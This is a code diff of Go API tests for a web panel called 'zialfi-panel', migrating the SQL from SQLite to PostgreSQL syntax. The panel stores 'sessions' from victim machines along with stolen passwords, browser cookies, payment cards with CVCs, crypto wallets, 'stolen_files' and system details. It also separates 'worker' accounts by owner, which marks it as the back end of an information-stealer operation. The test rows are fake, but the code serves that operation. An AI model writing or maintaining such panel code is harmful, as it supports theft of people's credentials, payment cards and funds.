@@ -11,8 +11,8 @@ import (
 	"github.com/go-chi/chi/v5"
 	"github.com/google/uuid"
 	"zialfi-panel/internal/api"
-	"zialfi-panel/internal/db"
 	"zialfi-panel/internal/auth"
+	"zialfi-panel/internal/testutil"
 )
 
 func setupSessionsTestRouter(t *testing.T, d *sql.DB) (chi.Router, string) {
@@ -21,17 +21,17 @@ func setupSessionsTestRouter(t *testing.T, d *sql.DB) (chi.Router, string) {
 	r := chi.NewRouter()
 
 	userID := createTestUser(t, d, "sessionsuser", "testpass")
-	token, _, err := auth.GenerateToken(userID, "admin", jwtSecret, "")
+	token, _, err := auth.GenerateToken(userID, "admin", jwtSecret, "", 0)
 	if err != nil {
 		t.Fatal(err)
 	}
 
-	api.SetupRoutes(r, d, jwtSecret, "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, jwtSecret, "*", nil, nil, nil, nil)
 	return r, token
 }
 
 func TestSessionsList_Empty(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	req := httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
@@ -64,13 +64,13 @@ func TestSessionsList_Empty(t *testing.T) {
 }
 
 func TestSessionsList_WithData(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	for i := 0; i < 5; i++ {
 		id := uuid.New().String()
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`,
 			id, "hwid-"+id[:8])
 		if err != nil {
 			t.Fatal(err)
@@ -111,13 +111,13 @@ func TestSessionsList_WithData(t *testing.T) {
 }
 
 func TestSessionsList_Pagination(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	for i := 0; i < 5; i++ {
 		id := uuid.New().String()
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP + $3::interval)`,
 			id, "hwid-"+id[:8], fmt.Sprintf("-%d days", i))
 		if err != nil {
 			t.Fatal(err)
@@ -154,7 +154,7 @@ func TestSessionsList_Pagination(t *testing.T) {
 }
 
 func TestSessionsList_FilterByCountry(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	sessions := []struct {
@@ -170,7 +170,7 @@ func TestSessionsList_FilterByCountry(t *testing.T) {
 
 	for _, s := range sessions {
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', 'hwid', 'win10', 'user', '1.2.3.4', ?, datetime('now'))`,
+			VALUES ($1, 'b1', 'hwid', 'win10', 'user', '1.2.3.4', $2, CURRENT_TIMESTAMP)`,
 			s.id, s.country)
 		if err != nil {
 			t.Fatal(err)
@@ -208,20 +208,19 @@ func TestSessionsList_FilterByCountry(t *testing.T) {
 }
 
 func TestSessionsList_FilterBySearch(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	id := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'b1', 'hwid-1', 'DESKTOP-ABC', 'alice', '192.168.1.1', 'US', datetime('now'))`,
-		id)
+		VALUES ($1, 'b1', 'hwid-1', 'DESKTOP-ABC', 'alice', '192.168.1.1', 'US', CURRENT_TIMESTAMP)`, id)
 	if err != nil {
 		t.Fatal(err)
 	}
 	for i := 0; i < 4; i++ {
 		otherID := uuid.New().String()
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '10.0.0.1', 'US', datetime('now'))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '10.0.0.1', 'US', CURRENT_TIMESTAMP)`,
 			otherID, "hwid-"+otherID[:8])
 		if err != nil {
 			t.Fatal(err)
@@ -252,14 +251,14 @@ func TestSessionsList_FilterBySearch(t *testing.T) {
 }
 
 func TestSessionsList_SortAsc(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	ids := make([]string, 5)
 	for i := 0; i < 5; i++ {
 		ids[i] = uuid.New().String()
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP + $3::interval)`,
 			ids[i], "hwid-"+ids[i][:8], fmt.Sprintf("-%d days", i))
 		if err != nil {
 			t.Fatal(err)
@@ -293,14 +292,14 @@ func TestSessionsList_SortAsc(t *testing.T) {
 }
 
 func TestSessionsList_SortDesc(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	ids := make([]string, 5)
 	for i := 0; i < 5; i++ {
 		ids[i] = uuid.New().String()
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now', ?))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP + $3::interval)`,
 			ids[i], "hwid-"+ids[i][:8], fmt.Sprintf("-%d days", i))
 		if err != nil {
 			t.Fatal(err)
@@ -334,7 +333,7 @@ func TestSessionsList_SortDesc(t *testing.T) {
 }
 
 func TestSessionsList_InvalidSort(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	req := httptest.NewRequest(http.MethodGet, "/api/sessions?sort=invalid", nil)
@@ -356,54 +355,53 @@ func TestSessionsList_InvalidSort(t *testing.T) {
 }
 
 func TestSessionsDetail_Existing(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	sessionID := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', datetime('now'))`,
-		sessionID)
+		VALUES ($1, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', CURRENT_TIMESTAMP)`, sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-		VALUES (?, ?, 'https://example.com', 'alice@example.com', 'secret123', 'chrome')`,
+		VALUES ($1, $2, 'https://example.com', 'alice@example.com', 'secret123', 'chrome')`,
 		uuid.New().String(), sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO cookies (id, session_id, domain, name, value, path)
-		VALUES (?, ?, 'example.com', 'sessionid', 'abc123', '/')`,
+		VALUES ($1, $2, 'example.com', 'sessionid', 'abc123', '/')`,
 		uuid.New().String(), sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc)
-		VALUES (?, ?, '4111111111111111', '12', '28', 'Alice', '123')`,
+		VALUES ($1, $2, '4111111111111111', '12', '28', 'Alice', '123')`,
 		uuid.New().String(), sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO wallets (id, session_id, name, path)
-		VALUES (?, ?, 'MetaMask', '/path/to/wallet')`,
+		VALUES ($1, $2, 'MetaMask', '/path/to/wallet')`,
 		uuid.New().String(), sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO stolen_files (id, session_id, filename, size)
-		VALUES (?, ?, 'passwords.txt', 1024)`,
+		VALUES ($1, $2, 'passwords.txt', 1024)`,
 		uuid.New().String(), sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	_, err = d.Exec(`INSERT INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
-		VALUES (?, 'Intel i7', 'NVIDIA RTX 3080', '32GB', 'Windows 10', '1920x1080', 'DESKTOP-ABC', '192.168.1.1', '00:11:22:33:44:55', '8.8.8.8', 'hwid-001', '2h 15m')`,
+		VALUES ($1, 'Intel i7', 'NVIDIA RTX 3080', '32GB', 'Windows 10', '1920x1080', 'DESKTOP-ABC', '192.168.1.1', '00:11:22:33:44:55', '8.8.8.8', 'hwid-001', '2h 15m')`,
 		sessionID)
 	if err != nil {
 		t.Fatal(err)
@@ -464,7 +462,7 @@ func TestSessionsDetail_Existing(t *testing.T) {
 }
 
 func TestSessionsDetail_NotFound(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+uuid.New().String(), nil)
@@ -486,12 +484,12 @@ func TestSessionsDetail_NotFound(t *testing.T) {
 }
 
 func TestSessionsDelete_Existing(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	sessionID := uuid.New().String()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-		VALUES (?, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', datetime('now'))`,
+		VALUES ($1, 'build-1', 'hwid-001', 'win10', 'alice', '192.168.1.1', 'US', CURRENT_TIMESTAMP)`,
 		sessionID)
 	if err != nil {
 		t.Fatal(err)
@@ -499,7 +497,7 @@ func TestSessionsDelete_Existing(t *testing.T) {
 
 	passID := uuid.New().String()
 	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
-		VALUES (?, ?, 'https://example.com', 'alice', 'secret', 'chrome')`,
+		VALUES ($1, $2, 'https://example.com', 'alice', 'secret', 'chrome')`,
 		passID, sessionID)
 	if err != nil {
 		t.Fatal(err)
@@ -515,7 +513,7 @@ func TestSessionsDelete_Existing(t *testing.T) {
 	}
 
 	var count int
-	err = d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = ?", sessionID).Scan(&count)
+	err = d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = $1", sessionID).Scan(&count)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -523,7 +521,7 @@ func TestSessionsDelete_Existing(t *testing.T) {
 		t.Error("expected session to be deleted")
 	}
 
-	err = d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id = ?", sessionID).Scan(&count)
+	err = d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id = $1", sessionID).Scan(&count)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -533,7 +531,7 @@ func TestSessionsDelete_Existing(t *testing.T) {
 }
 
 func TestSessionsDelete_NotFound(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	req := httptest.NewRequest(http.MethodDelete, "/api/sessions/"+uuid.New().String(), nil)
@@ -555,7 +553,7 @@ func TestSessionsDelete_NotFound(t *testing.T) {
 }
 
 func TestSessionsList_SearchByIP(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	sessions := []struct {
@@ -571,7 +569,7 @@ func TestSessionsList_SearchByIP(t *testing.T) {
 
 	for _, s := range sessions {
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', 'hwid', 'win10', 'user', ?, 'US', datetime('now'))`,
+			VALUES ($1, 'b1', 'hwid', 'win10', 'user', $2, 'US', CURRENT_TIMESTAMP)`,
 			s.id, s.ip)
 		if err != nil {
 			t.Fatal(err)
@@ -602,14 +600,14 @@ func TestSessionsList_SearchByIP(t *testing.T) {
 }
 
 func TestSessionsList_SearchByHWID(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r, token := setupSessionsTestRouter(t, d)
 
 	ids := []string{uuid.New().String(), uuid.New().String(), uuid.New().String()}
 	hwids := []string{"HWID-001", "HWID-002", "OTHER-003"}
 	for i := range ids {
 		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
-			VALUES (?, 'b1', ?, 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`,
+			VALUES ($1, 'b1', $2, 'win10', 'user', '1.2.3.4', 'US', CURRENT_TIMESTAMP)`,
 			ids[i], hwids[i])
 		if err != nil {
 			t.Fatal(err)
@@ -639,11 +637,10 @@ func TestSessionsList_SearchByHWID(t *testing.T) {
 	}
 }
 
-
 func workerToken(t *testing.T, d *sql.DB, username string) (string, string) {
 	t.Helper()
 	userID := createTestUserWithRole(t, d, username, "testpass", "worker")
-	token, _, err := auth.GenerateToken(userID, "worker", "test-secret", "")
+	token, _, err := auth.GenerateToken(userID, "worker", "test-secret", "", 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -653,16 +650,16 @@ func workerToken(t *testing.T, d *sql.DB, username string) (string, string) {
 func insertSessionWithOwner(t *testing.T, d *sql.DB, id, ownerID string) {
 	t.Helper()
 	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
-		VALUES (?, 'b1', 'hwid', 'win10', 'user', '1.2.3.4', 'US', ?, datetime('now'))`, id, ownerID)
+		VALUES ($1, 'b1', 'hwid', 'win10', 'user', '1.2.3.4', 'US', $2, CURRENT_TIMESTAMP)`, id, ownerID)
 	if err != nil {
 		t.Fatal(err)
 	}
 }
 
 func TestSessionsList_OwnerIsolation(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r := chi.NewRouter()
-	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, nil)
 
 	tokenA, userA := workerToken(t, d, "ownera")
 	tokenB, userB := workerToken(t, d, "ownerb")
@@ -673,9 +670,9 @@ func TestSessionsList_OwnerIsolation(t *testing.T) {
 	insertSessionWithOwner(t, d, sessionB, userB)
 
 	for _, tc := range []struct {
-		token      string
-		wantCount  int
-		wantID     string
+		token     string
+		wantCount int
+		wantID    string
 	}{
 		{tokenA, 1, sessionA},
 		{tokenB, 1, sessionB},
@@ -707,9 +704,9 @@ func TestSessionsList_OwnerIsolation(t *testing.T) {
 }
 
 func TestSessionsDetail_OwnerForbidden(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r := chi.NewRouter()
-	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, nil)
 
 	_, userA := workerToken(t, d, "ownera")
 	tokenB, _ := workerToken(t, d, "ownerb")
@@ -728,9 +725,9 @@ func TestSessionsDetail_OwnerForbidden(t *testing.T) {
 }
 
 func TestSessionsDelete_OwnerForbidden(t *testing.T) {
-	d := openTestDB(t)
+	d := testutil.OpenTestDB(t)
 	r := chi.NewRouter()
-	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)
+	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, nil)
 
 	_, userA := workerToken(t, d, "ownera")
 	tokenB, _ := workerToken(t, d, "ownerb")
@@ -748,7 +745,7 @@ func TestSessionsDelete_OwnerForbidden(t *testing.T) {
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = ?", sessionA).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = $1", sessionA).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected session to survive, got count=%d", count)
 	}
